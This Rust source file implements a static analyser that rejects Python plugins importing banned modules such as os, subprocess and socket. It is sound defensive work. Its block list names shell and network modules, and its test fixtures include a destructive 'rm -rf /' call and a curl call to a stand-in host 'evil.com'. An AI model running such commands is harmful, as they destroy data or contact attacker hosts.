//! Gatekeeper: Static Analysis for Python Plugins
//!
//! Validates Python source code using AST analysis to prevent:
//! - Execution of dangerous system calls
//! - Import of banned modules
//! - Use of restricted language features
//!
//! **Design Philosophy:**
//! Static analysis in Rust, not runtime validation in Python.
//! Zero-dependency on Python interpreter for security checks.

use anyhow::{Context, Result};
use rustpython_ast::Visitor;
use rustpython_parser::{ast, Parse};
use std::collections::HashSet;

/// Banned modules that plugins are not allowed to import (standard profile).
const BANNED_MODULES: &[&str] = &[
    "os",
    "subprocess",
    "sys",
    "shutil",
    "socket",
    "ctypes",
    "multiprocessing",
    "__import__",
    "importlib",
];

/// Modules that trigger warnings (dfir profile).
const DFIR_WARN_MODULES: &[&str] = &["subprocess", "socket", "multiprocessing"];

/// Banned modules for dfir profile (kept as errors).
const DFIR_BANNED_MODULES: &[&str] = &["shutil", "ctypes", "__import__", "importlib"];

#[derive(Debug, Clone, Copy)]
pub enum GatekeeperProfile {
    Standard,
    Dfir,
}

#[derive(Debug, Clone)]
pub struct GatekeeperReport {
    pub errors: Vec<String>,
    pub warnings: Vec<String>,
}

/// Gatekeeper validates Python source code for security violations
pub struct Gatekeeper {
    banned_modules: HashSet<String>,
    warn_modules: HashSet<String>,
}

impl Default for Gatekeeper {
    fn default() -> Self {
        Self::new()
    }
}

impl Gatekeeper {
    /// Create a new Gatekeeper with default banned modules
    pub fn new() -> Self {
        Self::with_profile(GatekeeperProfile::Standard)
    }

    /// Create a new Gatekeeper with a specific profile.
    pub fn with_profile(profile: GatekeeperProfile) -> Self {
        match profile {
            GatekeeperProfile::Standard => Self {
                banned_modules: BANNED_MODULES.iter().map(|s| s.to_string()).collect(),
                warn_modules: HashSet::new(),
            },
            GatekeeperProfile::Dfir => Self {
                banned_modules: DFIR_BANNED_MODULES.iter().map(|s| s.to_string()).collect(),
                warn_modules: DFIR_WARN_MODULES.iter().map(|s| s.to_string()).collect(),
            },
        }
    }

    /// Validate Python source code
    ///
    /// Returns `Ok(())` if code passes validation, or `Err` with a list of violations.
    pub fn validate(&self, source_code: &str) -> Result<()> {
        let report = self.analyze(source_code)?;
        if report.errors.is_empty() && report.warnings.is_empty() {
            return Ok(());
        }
        let mut lines = Vec::new();
        for err in &report.errors {
            lines.push(format!("- {}", err));
        }
        for warn in &report.warnings {
            lines.push(format!("- {}", warn));
        }
        anyhow::bail!("Security validation failed:\n{}", lines.join("\n"))
    }

    /// Analyze Python source code and return structured violations.
    pub fn analyze(&self, source_code: &str) -> Result<GatekeeperReport> {
        // Parse the Python source code into an AST
        let ast = ast::Suite::parse(source_code, "<plugin>")
            .context("Failed to parse Python source code")?;

        let mut visitor = GatekeeperVisitor::new(&self.banned_modules, &self.warn_modules);
        for stmt in ast {
            visitor.visit_stmt(stmt);
        }

        Ok(GatekeeperReport {
            errors: visitor.errors,
            warnings: visitor.warnings,
        })
    }
}

struct GatekeeperVisitor<'a> {
    banned_modules: &'a HashSet<String>,
    warn_modules: &'a HashSet<String>,
    errors: Vec<String>,
    warnings: Vec<String>,
}

impl<'a> GatekeeperVisitor<'a> {
    fn new(banned_modules: &'a HashSet<String>, warn_modules: &'a HashSet<String>) -> Self {
        Self {
            banned_modules,
            warn_modules,
            errors: Vec::new(),
            warnings: Vec::new(),
        }
    }

    fn check_import(&mut self, module_name: &str, context: &str) {
        if let Some(level) = self.violation_level(module_name) {
            let message = match level {
                ViolationLevel::Error => {
                    format!("Banned import: '{} {}'", context, module_name)
                }
                ViolationLevel::Warning => {
                    format!("Warning import: '{} {}'", context, module_name)
                }
            };
            self.record_violation(level, message);
        }
    }

    fn check_dynamic_import(&mut self, func: &ast::Expr) {
        if let Some(name) = dynamic_import_name(func) {
            if let Some(level) = self.violation_level(&name) {
                let message = match level {
                    ViolationLevel::Error => format!("Banned dynamic import: '{}'", name),
                    ViolationLevel::Warning => format!("Warning dynamic import: '{}'", name),
                };
                self.record_violation(level, message);
            }
        }
    }

    fn violation_level(&self, module_name: &str) -> Option<ViolationLevel> {
        if self.banned_modules.contains(module_name) {
            return Some(ViolationLevel::Error);
        }
        if self.warn_modules.contains(module_name) {
            return Some(ViolationLevel::Warning);
        }
        let base = if module_name.ends_with(".__import__") {
            "__import__"
        } else {
            module_name.split('.').next().unwrap_or(module_name)
        };
        if self.banned_modules.contains(base) {
            return Some(ViolationLevel::Error);
        }
        if self.warn_modules.contains(base) {
            return Some(ViolationLevel::Warning);
        }
        None
    }

    fn record_violation(&mut self, level: ViolationLevel, message: String) {
        match level {
            ViolationLevel::Error => self.errors.push(message),
            ViolationLevel::Warning => self.warnings.push(message),
        }
    }
}

#[derive(Debug, Clone, Copy)]
enum ViolationLevel {
    Error,
    Warning,
}

fn dynamic_import_name(func: &ast::Expr) -> Option<String> {
    match func {
        ast::Expr::Name(name) => {
            if name.id.as_str() == "__import__" {
                Some("__import__".to_string())
            } else {
                None
            }
        }
        ast::Expr::Attribute(attr) => {
            let attr_name = attr.attr.as_str();
            match attr_name {
                "import_module" | "reload" => {
                    if let ast::Expr::Name(value) = attr.value.as_ref() {
                        if value.id.as_str() == "importlib" {
                            return Some(format!("importlib.{}", attr_name));
                        }
                    }
                }
                "__import__" => {
                    if let ast::Expr::Name(value) = attr.value.as_ref() {
                        let name = value.id.as_str();
                        if name == "builtins" || name == "__builtins__" {
                            return Some(format!("{}.{}", name, attr_name));
                        }
                    }
                }
                _ => {}
            }
            None
        }
        _ => None,
    }
}

impl<'a> Visitor for GatekeeperVisitor<'a> {
    fn visit_stmt_import(&mut self, node: ast::StmtImport) {
        for alias in &node.names {
            self.check_import(alias.name.as_str(), "import");
        }
        self.generic_visit_stmt_import(node);
    }

    fn visit_stmt_import_from(&mut self, node: ast::StmtImportFrom) {
        if let Some(module) = &node.module {
            self.check_import(module.as_str(), "from");
        }
        self.generic_visit_stmt_import_from(node);
    }

    fn visit_expr_call(&mut self, node: ast::ExprCall) {
        self.check_dynamic_import(&node.func);
        self.generic_visit_expr_call(node);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_code() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import pandas as pd
import pyarrow as pa

def parse(file_path):
    df = pd.read_csv(file_path)
    return pa.Table.from_pandas(df)
"#;
        assert!(gatekeeper.validate(code).is_ok());
    }

    #[test]
    fn test_banned_import_os() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import os

def parse(file_path):
    os.system("rm -rf /")
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned import: 'import os'"));
    }

    #[test]
    fn test_banned_import_subprocess() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
from subprocess import run

def parse(file_path):
    run(["curl", "evil.com"])
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned import: 'from subprocess'"));
    }

    #[test]
    fn test_banned_import_in_function() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import pandas as pd

def parse(file_path):
    import socket  # Evil nested import
    return pd.DataFrame()
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned import: 'import socket'"));
    }

    #[test]
    fn test_multiple_violations() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import os
from subprocess import run
import socket
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("import os"));
        assert!(err.contains("from subprocess"));
        assert!(err.contains("import socket"));
    }

    #[test]
    fn test_banned_dynamic_import_dunder() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
def parse(file_path):
    __import__("os")
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned dynamic import: '__import__'"));
    }

    #[test]
    fn test_banned_dynamic_import_importlib() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
def parse(file_path):
    importlib.import_module("os")
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned dynamic import: 'importlib.import_module'"));
    }

    #[test]
    fn test_dfir_profile_allows_os_sys_pathlib() {
        let gatekeeper = Gatekeeper::with_profile(GatekeeperProfile::Dfir);
        let code = r#"
import os
import sys
import pathlib

def parse(file_path):
    return file_path
"#;
        let report = gatekeeper.analyze(code).unwrap();
        assert!(report.errors.is_empty());
        assert!(report.warnings.is_empty());
    }

    #[test]
    fn test_dfir_profile_warns_on_subprocess() {
        let gatekeeper = Gatekeeper::with_profile(GatekeeperProfile::Dfir);
        let code = r#"
import subprocess

def parse(file_path):
    return file_path
"#;
        let report = gatekeeper.analyze(code).unwrap();
        assert!(report.errors.is_empty());
        assert!(report
            .warnings
            .iter()
            .any(|msg| msg.contains("Warning import: 'import subprocess'")));
    }

    #[test]
    fn test_invalid_python_syntax() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
def invalid syntax here
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Failed to parse"));
    }
}
